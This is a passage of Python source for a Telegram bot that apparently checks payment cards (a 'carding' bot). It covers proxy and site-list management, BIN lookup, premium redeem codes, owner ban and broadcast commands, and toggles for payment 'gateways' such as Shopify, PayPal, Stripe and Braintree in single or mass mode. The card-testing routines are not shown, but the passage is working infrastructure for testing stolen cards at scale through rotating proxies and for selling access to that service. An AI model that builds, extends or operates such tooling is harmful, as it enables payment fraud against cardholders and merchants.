        lines = [line.strip() for line in content.splitlines() if line.strip()]
        if not lines:
            await status_msg.edit(premium_emoji("❌ File is empty."), parse_mode='html')
            return

        sites_to_check = []
        invalid = []
        for line in lines:
            if line.startswith('http://') or line.startswith('https://'):
                sites_to_check.append(line)
            else:
                invalid.append(line)

        if invalid:
            await event.reply(premium_emoji(f"⚠️ Skipped {len(invalid)} invalid lines (must start with http:// or https://)."))

        if not sites_to_check:
            await status_msg.edit(premium_emoji("❌ No valid URLs found in file."), parse_mode='html')
            return

        # --- LIMIT TO 150 SITES ---
        original_count = len(sites_to_check)
        if original_count > MAX_SITES_PER_UPLOAD:
            sites_to_check = sites_to_check[:MAX_SITES_PER_UPLOAD]
            await event.reply(premium_emoji(f"⚠️ File contains {original_count} sites. Only the first {MAX_SITES_PER_UPLOAD} will be checked and added."), parse_mode='html')
        # -------------------------

        await status_msg.edit(premium_emoji(f"🔍 Checking {len(sites_to_check)} sites for aliveness..."), parse_mode='html')
        current_sites = set(load_sites())
        alive = []
        dead = []
        total = len(sites_to_check)

        for i, site in enumerate(sites_to_check):
            if site in current_sites:
                continue
            result = await test_site(site)
            if result['status'] == 'alive':
                alive.append(site)
                async with aiofiles.open(SITES_FILE, 'a') as f:
                    await f.write(f"{site}\n")
                current_sites.add(site)
            else:
                dead.append(site)
            if (i+1) % 5 == 0 or (i+1) == total:
                await status_msg.edit(premium_emoji(f"🔍 Checking sites...\n\n<b>Processed:</b> {i+1}/{total}\n<b>Alive (added):</b> {len(alive)}\n<b>Dead (skipped):</b> {len(dead)}"), parse_mode='html')

        await status_msg.edit(premium_emoji(f"✅ <b>Site Addition Complete!</b>\n\n<b>Processed:</b> {total}\n<b>Alive added:</b> {len(alive)}\n<b>Dead skipped:</b> {len(dead)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error processing file: {e}"), parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# /chkproxy – check a single proxy
@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        is_alive = await test_proxy(proxy)
        if is_alive:
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

# /rmproxy – remove a single proxy
@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    current = load_proxies()
    if proxy_to_remove not in current:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new = [p for p in current if p != proxy_to_remove]
    save_proxies(new)
    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

# /rmproxyindex – remove proxies by index
@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices."), parse_mode='html')
        return
    current = load_proxies()
    if not current:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return
    removed = []
    new = []
    for i, p in enumerate(current):
        if i in indices:
            removed.append(p)
        else:
            new.append(p)
    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return
    save_proxies(new)
    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

# /clearproxy – clear all proxies (with backup)
@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    current = load_proxies()
    count = len(current)
    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup = f"proxy_backup_{user_id}_{timestamp}.txt"
    try:
        async with aiofiles.open(backup, 'w') as f:
            for p in current:
                await f.write(f"{p}\n")
        await event.reply(premium_emoji(f"📦 <b>Backup Created!</b>\n\nSending backup of {count} proxies before clearing..."), file=backup, parse_mode='html')
        try:
            os.remove(backup)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return
    save_proxies([])
    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

# /getproxy – get all proxies (as file if too many)
@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    current = load_proxies()
    if not current:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return
    if len(current) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, p in enumerate(current):
                await f.write(f"{i+1}. {p}\n")
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

# /addproxy – add proxies from text (one per line, with alive check)
@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.is_group or event.is_channel:
        await event.reply(premium_emoji("⚠️ Proxies can only be added in <b>private chat</b> with the bot. Use /addproxy in DM."), parse_mode='html')
        return
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."), parse_mode='html')
            return
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return
        current = load_proxies()
        new = []
        total = len(proxies_to_add)
        status_msg = await event.reply(premium_emoji(f"🔄 Checking {total} proxies..."), parse_mode='html')
        added = 0
        failed = 0
        for i, proxy in enumerate(proxies_to_add):
            if proxy in current:
                failed += 1
            else:
                if await test_proxy(proxy):
                    new.append(proxy)
                    added += 1
                else:
                    failed += 1
            await status_msg.edit(premium_emoji(f"🔄 Checking proxies...\n\n<b>Processed:</b> {i+1}/{total}\n<b>Added:</b> {added}\n<b>Failed:</b> {failed}"), parse_mode='html')
            await asyncio.sleep(0.3)
        if new:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                for proxy in new:
                    await f.write(f"{proxy}\n")
        await status_msg.edit(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {added} new proxies to `proxy.txt`.\nFailed: {failed}"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"), parse_mode='html')

# /rm – remove a site
@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"), parse_mode='html')
            return
        url_to_remove = args[1].strip()
        current = load_sites()
        if url_to_remove not in current:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"), parse_mode='html')
            return
        new = [site for site in current if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new:
                await f.write(f"{site}\n")
        await event.reply(premium_emoji(f"✅ <b>Site Removed Successfully!</b>\n\n`{url_to_remove}` has been deleted from `sites.txt`."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error removing site: {e}"), parse_mode='html')

# ========== OWNER COMMANDS ==========
def generate_redeem_code(days_valid=30):
    """Generate a truly unique redeem code – never repeats."""
    codes = load_json(REDEEM_FILE, {})
    # Load used codes (including expired) to avoid any collision
    used_codes = set(codes.keys())
    
    # Keep generating until we find a code not in used_codes
    while True:
        code = f"STORM-{random.randint(100000, 9999999)}"
        if code not in used_codes:
            break
    
    expiry = time.time() + days_valid * 86400
    codes[code] = {"value": days_valid, "expiry": expiry, "used_by": None}
    save_json(REDEEM_FILE, codes)
    return code, days_valid

def redeem_code(user_id, code):
    codes = load_json(REDEEM_FILE, {})
    if code not in codes:
        return False, "Invalid code"
    entry = codes[code]
    if entry["used_by"] is not None:
        return False, "Code already used"
    if entry["expiry"] < time.time():
        return False, "Code expired"
    entry["used_by"] = user_id
    codes[code] = entry
    save_json(REDEEM_FILE, codes)
    prem = load_premium_users()
    prem[str(user_id)] = entry["expiry"]
    save_json(PREMIUM_FILE, prem)
    return True, f"Premium activated until {datetime.fromtimestamp(entry['expiry']).strftime('%Y-%m-%d %H:%M:%S')}"

@bot.on(events.NewMessage(pattern=r'^/bin(?:\s+(.+))?$'))
async def bin_lookup(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/bin &lt;card or 6-digit BIN&gt;</code>"), parse_mode='html')
        return
    raw = args[1].replace('|', '').strip()
    bin_number = raw[:6]
    if not bin_number.isdigit() or len(bin_number) < 6:
        await event.reply(premium_emoji("❌ Invalid BIN. Please provide a valid card number or 6-digit BIN."), parse_mode='html')
        return
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
    except:
        first_name = "User"
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
    info_str = " | ".join(filter(lambda x: x and x != '-', [brand, bin_type, level]))
    msg = (
        "<b>𝐁𝐢𝐧 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 🔍</b>\n"
        "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        f"𝐁𝐢𝐧 ➜ <code>{bin_number}</code>\n"
        f"𝗜𝗻𝗳𝗼 ➜ {info_str if info_str else '-'}\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➜ {bank}\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {country} {flag}\n"
        "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ {first_name}"
    )
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem(?:$|\\s+)'))
async def redeem(event):
    user_id = event.sender_id
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/redeem CODE</code>"), parse_mode='html')
        return
    code = args[1].strip()
    
    # Check if user already has premium
    if is_premium(user_id):
        exp = load_premium_users().get(str(user_id))
        if exp:
            exp_date = datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
            await event.reply(premium_emoji(f"❌ You already have an active premium subscription until `{exp_date}`.\nYou cannot redeem a new code until it expires."), parse_mode='html')
        else:
            await event.reply(premium_emoji("❌ You already have an active premium subscription. Cannot redeem another code."), parse_mode='html')
        return
    
    codes = load_json(REDEEM_FILE, {})
    if code not in codes:
        await event.reply(premium_emoji(f"❌ Invalid code: `{code}` not found."), parse_mode='html')
        return
    
    entry = codes[code]
    if entry["used_by"] is not None:
        await event.reply(premium_emoji(f"❌ Code already used by user `{entry['used_by']}`."), parse_mode='html')
        return
    if entry["expiry"] < time.time():
        await event.reply(premium_emoji(f"❌ Code expired on {datetime.fromtimestamp(entry['expiry']).strftime('%Y-%m-%d %H:%M:%S')}."), parse_mode='html')
        return
    
    # Mark as used
    entry["used_by"] = user_id
    codes[code] = entry
    save_json(REDEEM_FILE, codes)
    
    # Add premium
    prem = load_premium_users()
    prem[str(user_id)] = entry["expiry"]
    save_json(PREMIUM_FILE, prem)
    
    msg = f"✅ <b>Redeemed!</b>\n\nPremium activated until {datetime.fromtimestamp(entry['expiry']).strftime('%Y-%m-%d %H:%M:%S')}"
    await event.reply(premium_emoji(msg), parse_mode='html')
    
@bot.on(events.NewMessage(pattern=r'^/ban(?:\s+(\d+))?$', from_users=OWNER_ID))
async def ban_cmd(event):
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("🔨 <b>Ban User</b>\n\nUsage: <code>/ban &lt;user_id&gt;</code>"), parse_mode='html')
        return
    try:
        target = int(args[1])
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID. Must be a number."), parse_mode='html')
        return
    if target == OWNER_ID:
        await event.reply(premium_emoji("❌ You cannot ban yourself!"), parse_mode='html')
        return
    if ban_user(target):
        await event.reply(premium_emoji(f"🔨 <b>User Banned</b>\n\n<b>User ID:</b> <code>{target}</code>\n<b>Status:</b> ❌ Banned from bot"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"⚠️ User <code>{target}</code> is already banned."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/unban(?:\s+(\d+))?$', from_users=OWNER_ID))
async def unban_cmd(event):
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("✅ <b>Unban User</b>\n\nUsage: <code>/unban &lt;user_id&gt;</code>"), parse_mode='html')
        return
    try:
        target = int(args[1])
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID. Must be a number."), parse_mode='html')
        return
    if unban_user(target):
        await event.reply(premium_emoji(f"✅ <b>User Unbanned</b>\n\n<b>User ID:</b> <code>{target}</code>\n<b>Status:</b> ✅ Restored access to bot"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"⚠️ User <code>{target}</code> is not in the ban list."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/banlist$', from_users=OWNER_ID))
async def banlist_cmd(event):
    banned = load_json(BANNED_FILE, [])
    if not banned:
        await event.reply(premium_emoji("📋 <b>Banned Users</b>\n\n✅ No users are currently banned."), parse_mode='html')
        return
    lines = "\n".join(f"• <code>{uid}</code>" for uid in banned)
    await event.reply(premium_emoji(f"📋 <b>Banned Users ({len(banned)})</b>\n\n{lines}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremium(?:\s+|$)', from_users=OWNER_ID))
async def addpremium_cmd(event):
    args = event.message.text.split()
    if len(args) < 3:
        await event.reply(premium_emoji(
            "👑 <b>Add Premium</b>\n\n"
            "Usage: <code>/addpremium &lt;user_id&gt; &lt;days&gt;</code>\n\n"
            "Example: <code>/addpremium 123456789 30</code>"
        ), parse_mode='html')
        return
    try:
        target = int(args[1])
        days = int(args[2])
        if days < 1:
            raise ValueError
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid input. User ID and days must be valid numbers."), parse_mode='html')
        return
    prem = load_json(PREMIUM_FILE, {})
    existing = prem.get(str(target))
    now = time.time()
    base = max(existing, now) if existing and existing > now else now
    expiry = base + days * 86400
    prem[str(target)] = expiry
    save_json(PREMIUM_FILE, prem)
    expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
    await event.reply(premium_emoji(
        f"👑 <b>Premium Granted!</b>\n\n"
        f"<b>[•] User ID:</b> <code>{target}</code>\n"
        f"<b>[•] Days Added:</b> {days}\n"
        f"<b>[•] Plan:</b> Pro 💎\n"
        f"<b>[•] Expires:</b> {expiry_str}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/removepremium(?:\s+|$)', from_users=OWNER_ID))
async def removepremium_cmd(event):
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji(
            "🗑️ <b>Remove Premium</b>\n\n"
            "Usage: <code>/removepremium &lt;user_id&gt;</code>\n\n"
            "Example: <code>/removepremium 123456789</code>"
        ), parse_mode='html')
        return
    try:
        target = int(args[1])
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID. Must be a number."), parse_mode='html')
        return
    prem = load_json(PREMIUM_FILE, {})
    if str(target) not in prem:
        await event.reply(premium_emoji(f"⚠️ User <code>{target}</code> does not have an active premium plan."), parse_mode='html')
        return
    del prem[str(target)]
    save_json(PREMIUM_FILE, prem)
    await event.reply(premium_emoji(
        f"🗑️ <b>Premium Revoked!</b>\n\n"
        f"<b>[•] User ID:</b> <code>{target}</code>\n"
        f"<b>[•] Plan:</b> Removed ❌\n"
        f"<b>[•] Status:</b> Downgraded to Free 🤡"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gen(?:$|\\s+)', from_users=OWNER_ID))
async def gen_codes(event):
    args = event.message.text.split()
    quantity = 1
    days = 30
    if len(args) > 1:
        try:
            quantity = int(args[1])
            if quantity < 1:
                quantity = 1
        except:
            quantity = 1
    if len(args) > 2:
        try:
            days = int(args[2])
            if days < 1:
                days = 1
        except:
            days = 30
    
    # Ensure file is writable
    if not ensure_file_writable(REDEEM_FILE):
        await event.reply(premium_emoji("❌ Cannot write to redeem codes file. Check permissions."), parse_mode='html')
        return
    
    codes_generated = []
    for _ in range(quantity):
        code, _ = generate_redeem_code(days)
        codes_generated.append(code)
    
    msg = f"🎉 <b>{quantity} REDEEM CODE(S) GENERATED</b>\n━━━━━━━━━━━━━━━━━━\n📦 Info:\n• Quantity: {quantity}\n• Validity: {days} days\n━━━━━━━━━━━━━━━━━━\n"
    for c in codes_generated:
        msg += f"<code>/redeem {c}</code>\n"
    msg += "━━━━━━━━━━━━━━━━━━\n"
    msg += f"💾 Saved in: `{os.path.abspath(REDEEM_FILE)}`"
    await event.reply(premium_emoji(msg), parse_mode='html')
            
@bot.on(events.NewMessage(pattern='/codes(?:$|\\s+)', from_users=OWNER_ID))
async def list_codes(event):
    codes = load_json(REDEEM_FILE, {})
    unused = {k:v for k,v in codes.items() if v["used_by"] is None}
    if not unused:
        await event.reply(premium_emoji("No unused codes."), parse_mode='html')
        return
    msg = "<b>📋 UNUSED REDEEM CODES</b>\n━━━━━━━━━━━━━━━━━━\n"
    for code, info in unused.items():
        expiry = datetime.fromtimestamp(info["expiry"]).strftime('%Y-%m-%d')
        msg += f"<code>{code}</code> – {info['value']} days (expires {expiry})\n"
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/delcode(?:$|\\s+)', from_users=OWNER_ID))
async def delete_code(event):
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("Usage: `/delcode STORM-XXXXXXX`"), parse_mode='html')
        return
    code = args[1].strip()
    codes = load_json(REDEEM_FILE, {})
    if code not in codes:
        await event.reply(premium_emoji("❌ Code not found."), parse_mode='html')
        return
    del codes[code]
    save_json(REDEEM_FILE, codes)
    await event.reply(premium_emoji(f"✅ Code `{code}` deleted."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/grp(?:$|\\s+)', from_users=OWNER_ID))
async def manage_groups(event):
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("Usage: `/grp add <group_id>` or `/grp rm <group_id>` or `/grp list`"), parse_mode='html')
        return
    action = args[1].lower()
    groups = load_approved_groups()
    if action == 'list':
        txt = "\n".join(str(g) for g in groups)
        await event.reply(premium_emoji(f"<b>Approved groups:</b>\n<code>{txt}</code>"), parse_mode='html')
    elif action == 'add' and len(args) > 2:
        try:
            gid = int(args[2])
            if gid not in groups:
                groups.append(gid)
                save_approved_groups(groups)
                await event.reply(premium_emoji(f"✅ Group {gid} added."), parse_mode='html')
            else:
                await event.reply(premium_emoji(f"⚠️ Already approved."), parse_mode='html')
        except:
            await event.reply(premium_emoji("❌ Invalid group ID"), parse_mode='html')
    elif action == 'rm' and len(args) > 2:
        try:
            gid = int(args[2])
            if gid in groups:
                groups.remove(gid)
                save_approved_groups(groups)
                await event.reply(premium_emoji(f"✅ Group {gid} removed."), parse_mode='html')
            else:
                await event.reply(premium_emoji(f"❌ Not in list."), parse_mode='html')
        except:
            await event.reply(premium_emoji("❌ Invalid group ID"), parse_mode='html')
    else:
        await event.reply(premium_emoji("Invalid command."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gate(?:$|\\s+)', from_users=OWNER_ID))
async def gateway_settings_cmd(event):
    args = event.message.text.split()
    if len(args) < 3:
        await event.reply(premium_emoji("Usage: `/gate <gateway> <on|off|single|mass>`\nGateways: shopify, paypal, paypal2, stripe_auth, stripe_donation, razorpay, stripe5, braintree, payflow"), parse_mode='html')
        return
    gateway = args[1].lower()
    setting = args[2].lower()
    settings = load_gateway_settings()
    if gateway not in settings:
        await event.reply(premium_emoji(f"❌ Unknown gateway"), parse_mode='html')
        return
    if setting in ['on','off']:
        settings[gateway]['enabled'] = (setting == 'on')
        save_gateway_settings(settings)
        await event.reply(premium_emoji(f"✅ {gateway} {'enabled' if setting=='on' else 'disabled'}"), parse_mode='html')
    elif setting in ['single','mass']:
        mode = 'single' if setting == 'single' else 'mass'
        current = settings[gateway][mode]
        settings[gateway][mode] = not current
        save_gateway_settings(settings)
        await event.reply(premium_emoji(f"✅ {gateway} {mode} check {'enabled' if not current else 'disabled'}"), parse_mode='html')
    else:
        await event.reply(premium_emoji("Invalid. Use on/off/single/mass"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/api(?:$|\\s+)', from_users=OWNER_ID))
async def manage_apis(event):
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("Usage:\n`/api list`\n`/api add <api_url>`\n`/api rm <index>`\n`/api priority <index1,index2,...>`"), parse_mode='html')
        return
    action = args[1].lower()
    api_settings = load_api_settings()
    apis = api_settings.get('shopify_proxyless_apis', [PROXYLESS_API_1, PROXYLESS_API_2])
    if action == 'list':
        txt = "\n".join(f"{i+1}. {url}" for i, url in enumerate(apis))
        await event.reply(premium_emoji(f"<b>Proxyless APIs (priority order):</b>\n<code>{txt}</code>"), parse_mode='html')
    elif action == 'add' and len(args) > 2:
        new_api = args[2].strip()
        apis.append(new_api)
        api_settings['shopify_proxyless_apis'] = apis
        save_api_settings(api_settings)
        await event.reply(premium_emoji(f"✅ Added: {new_api}"), parse_mode='html')
    elif action == 'rm' and len(args) > 2:
        try:
            idx = int(args[2]) - 1
            if 0 <= idx < len(apis):
                removed = apis.pop(idx)
                api_settings['shopify_proxyless_apis'] = apis
                save_api_settings(api_settings)
                await event.reply(premium_emoji(f"✅ Removed: {removed}"), parse_mode='html')
            else:
                await event.reply(premium_emoji("❌ Invalid index"), parse_mode='html')
        except:
            await event.reply(premium_emoji("❌ Invalid index"), parse_mode='html')
    elif action == 'priority' and len(args) > 2:
        order = args[2].split(',')
        new_order = []
        for idx in order:
            try:
                i = int(idx.strip()) - 1
                if 0 <= i < len(apis):
                    new_order.append(apis[i])
            except:
                pass
        if new_order:
            api_settings['shopify_proxyless_apis'] = new_order
            save_api_settings(api_settings)
            await event.reply(premium_emoji("✅ Priority updated"), parse_mode='html')
        else:
            await event.reply(premium_emoji("❌ Invalid indices"), parse_mode='html')
    else:
        await event.reply(premium_emoji("Invalid command"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/broadcast(?:$|\\s+)', from_users=OWNER_ID))
async def broadcast_cmd(event):
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        text = reply.raw_text
        media = reply.media
    else:
        text = event.message.text.replace('/broadcast', '', 1).strip()
        media = None
    if not media and not text:
        await event.reply(premium_emoji("❌ Provide text or reply to a message"), parse_mode='html')
        return
    users = load_json(USERS_FILE, [])
    if not users:
        await event.reply(premium_emoji("No users to broadcast."), parse_mode='html')
        return
    sent = 0
    for uid in users:
        try:
            if media:
                await bot.send_message(uid, media, caption=text, parse_mode='html')
            else:
                await bot.send_message(uid, premium_emoji(text), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await event.reply(premium_emoji(f"✅ Broadcast sent to {sent} users."), parse_mode='html')

# ---------- Forward feature ----------
def add_forward_queue(user_id, msg_id, chat_id, is_media, caption):
    queue = load_json(FORWARD_QUEUE_FILE, [])
    queue.append({
        "id": str(uuid.uuid4()),
        "user_id": user_id,
        "msg_id": msg_id,
        "chat_id": chat_id,
        "is_media": is_media,
        "caption": caption,
        "status": "pending"
    })
    save_json(FORWARD_QUEUE_FILE, queue)

@bot.on(events.NewMessage(pattern='/f(?:$|\\s+)'))
async def forward_to_owner(event):
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a message or media to forward."), parse_mode='html')
        return
    user_id = event.sender_id
    reply = await event.get_reply_message()
    is_media = bool(reply.media)
    caption = reply.raw_text[:500]
    chat_id = event.chat_id
    msg_id = reply.id
    add_forward_queue(user_id, msg_id, chat_id, is_media, caption)
    pending = [f for f in load_json(FORWARD_QUEUE_FILE, []) if f["status"] == "pending"]
    fwd_id = pending[-1]["id"]
    buttons = [
        [Button.inline("✅ Approve & Broadcast", f"approve_{fwd_id}"),
         Button.inline("❌ Reject", f"reject_{fwd_id}")]
    ]
    await bot.send_message(OWNER_ID, f"📨 New forward from user {user_id}\n\n{caption[:200]}", buttons=buttons)
    await event.reply(premium_emoji("✅ Message forwarded to owner for approval."), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"approve_(.+)"))
async def approve_forward(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Only owner", alert=True)
        return
    fwd_id = event.data_match.group(1).decode()
    queue = load_json(FORWARD_QUEUE_FILE, [])
    item = None
    for f in queue:
        if f["id"] == fwd_id:
            item = f
            break
    if not item or item["status"] != "pending":
        await event.answer("No such pending forward", alert=True)
        return
    groups = load_approved_groups()
    chat_id = item["chat_id"]
    msg_id = item["msg_id"]
    original_sender_id = item["user_id"]
    try:
        original_sender = await bot.get_entity(original_sender_id)
        sender_username = original_sender.username or f"user_{original_sender_id}"
    except:
        sender_username = f"user_{original_sender_id}"
    try:
        original = await bot.get_messages(chat_id, ids=int(msg_id))
    except:
        await event.edit("Failed to fetch original message")
        return
    success = 0
    for gid in groups:
        try:
            new_caption = f"{original.raw_text}\n\n🙏 **Feedback by @{sender_username}**" if original.raw_text else f"🙏 **Feedback by @{sender_username}**"
            if original.media:
                await bot.send_message(gid, original.media, caption=new_caption, parse_mode='html')
            else:
                await bot.send_message(gid, premium_emoji(new_caption), parse_mode='html')
            success += 1
            await asyncio.sleep(0.2)
        except:
            pass
    for f in queue:
        if f["id"] == fwd_id:
            f["status"] = "approved"
            break
    save_json(FORWARD_QUEUE_FILE, queue)
    await event.edit(f"✅ Forwarded to {success} groups.\n\nFeedback by @{sender_username}")
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"reject_(.+)"))
async def reject_forward(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Only owner", alert=True)
        return
    fwd_id = event.data_match.group(1).decode()
    queue = load_json(FORWARD_QUEUE_FILE, [])
    for f in queue:
        if f["id"] == fwd_id:
            f["status"] = "rejected"
            break
    save_json(FORWARD_QUEUE_FILE, queue)
    await event.edit("❌ Rejected.")
    await event.answer()

# ========== PAUSE/RESUME/STOP CALLBACKS ==========
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_cb(event):
    user_id = event.sender_id
    msg_id = event.message_id
    session_key = f"{user_id}_{msg_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")
    else:
        await event.answer("No active session", alert=True)

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_cb(event):
    user_id = event.sender_id
    msg_id = event.message_id
    session_key = f"{user_id}_{msg_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")
    else:
        await event.answer("No active session", alert=True)

@bot.on(events.CallbackQuery(pattern=b"mass_noop"))
async def mass_noop_cb(event):
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_cb(event):
    user_id = event.sender_id
    msg_id = event.message_id
    session_key = f"{user_id}_{msg_id}"
    if session_key in active_sessions:
